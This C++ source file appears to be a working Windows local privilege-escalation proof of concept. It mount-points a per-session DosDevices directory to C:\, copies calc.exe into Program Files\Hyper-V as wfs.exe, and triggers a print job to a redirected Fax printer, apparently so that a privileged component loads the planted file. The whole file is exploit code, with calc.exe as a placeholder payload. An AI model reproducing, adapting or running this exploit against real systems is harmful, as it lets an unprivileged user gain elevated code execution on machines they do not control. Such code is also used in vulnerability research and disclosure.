#include <Windows.h>
#include <iostream>
#include <wchar.h>
#include <conio.h>
#include <xpsobjectmodel.h>
#include <xpsprint.h>
#pragma comment(lib, "xpsprint.lib") 
#include "Win-Ops-Master.h"

#pragma warning(disable : 4995)
#pragma warning(disable : 4996)
OpsMaster op;

bool CopyFileNative(std::wstring src, std::wstring target) {

	HANDLE hsrc = op.OpenFileNative(src, GENERIC_READ, ALL_SHARING, OPEN_EXISTING);
	if (!hsrc)
		return false;
	HANDLE htarget = op.OpenFileNative(target, GENERIC_WRITE | DELETE, ALL_SHARING, CREATE_ALWAYS);
	if (!htarget)
		return false;
	LARGE_INTEGER li = { 0 };
	GetFileSizeEx(hsrc, &li);
	if (!li.QuadPart) {
		CloseHandle(hsrc);
		CloseHandle(htarget);
		return true;
	}
	void* src_content = HeapAlloc(GetProcessHeap(), NULL, li.QuadPart);
	op.ReadFileNative(hsrc, src_content, li.QuadPart);
	op.WriteFileNative(htarget, src_content, li.QuadPart);
	CloseHandle(hsrc);
	CloseHandle(htarget);
	HeapFree(GetProcessHeap(), NULL, src_content);
	return true;
}

std::wstring FindFaxSharedPrinter() {

	DWORD required_sz = 0;
	DWORD array_sz = 0;
	EnumPrinters(PRINTER_ENUM_LOCAL,
		NULL, 1, NULL, NULL, &required_sz, &array_sz);
	PRINTER_INFO_1* print_inf = 
		(PRINTER_INFO_1*)HeapAlloc(GetProcessHeap(), NULL, required_sz);
	EnumPrinters(PRINTER_ENUM_LOCAL,
		NULL, 1, (LPBYTE)print_inf, required_sz, &required_sz, &array_sz);
	std::wstring printer = L"";
	for (int i = 0; i < array_sz; i++) {
		printer = print_inf[i].pName;
		// lower case printer
		printer = std::wstring(_wcslwr((wchar_t*)printer.c_str()));
		if (printer.rfind(L"fax (redirected",0) != std::string::npos) {
			break;
		}
		printer = L"";
	}
	HeapFree(GetProcessHeap(), NULL, print_inf);
	return printer;
}

int wmain() {
	
	Wow64EnableWow64FsRedirection(FALSE);

	HANDLE hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE,
		FALSE, GetCurrentProcessId());
	if (hproc == NULL) {
		printf("Failed to open current process");
		return 0;
	}
	HANDLE htoken = NULL;
	bool b = OpenProcessToken(hproc, TOKEN_READ, &htoken);
	CloseHandle(hproc);
	if (!b) {
		printf("Failed to open process token");
		return 0;
	}

	TOKEN_STATISTICS stats = { 0 };
	DWORD retsz = 0;
	b = GetTokenInformation(htoken, TokenStatistics, &stats, sizeof(stats), &retsz);
	CloseHandle(htoken);
	if (!b) {
		printf("Failed to fetch for authentication ID");
		return 0;
	}
	WCHAR dir_path[MAX_PATH];
	wsprintf(dir_path, L"\\Sessions\\0\\DosDevices\\%08X-%08X\\(null)\\%s",
		stats.AuthenticationId.HighPart, stats.AuthenticationId.LowPart,
		op.GenerateRandomStr().c_str());
	
	HANDLE hdir = op.OpenDirectory(dir_path, GENERIC_READ | GENERIC_WRITE,
		ALL_SHARING,CREATE_NEW);
	if (!hdir) {
		wprintf(L"Failed to create %s", dir_path);
		return 0;
	}
	op.CreateMountPoint(hdir, std::wstring(L"C:\\"));
	CloseHandle(hdir);
	hdir = op.OpenDirectory(dir_path, GENERIC_READ | GENERIC_WRITE,
		ALL_SHARING, OPEN_EXISTING);
	op.CreateMountPoint(hdir, std::wstring(L"C:\\"));
	CloseHandle(hdir);
	std::wstring target = dir_path;
	//Hyper-V directory exist by default when it is installed
	//So we're assuming that this will forcibly exist
	target.append(L"\\Program Files\\Hyper-V\\wfs.exe");
	CopyFileNative(L"C:\\Windows\\System32\\calc.exe", target);
	//start printer job
	std::wstring printer_name = FindFaxSharedPrinter();
	if (printer_name.empty()) {
		printf("Failed to find Fax shared printer");
		return 1;
	}
	std::wstring cmd = L"start /MIN /WAIT C:\\Windows\\notepad.exe /pt \"C:\\Windows\\win.ini\" \"";
	cmd.append(printer_name);
	cmd.append(L"\"");
	_wsystem(cmd.c_str());

	RemoveDirectory(dir_path);
	return 0;
}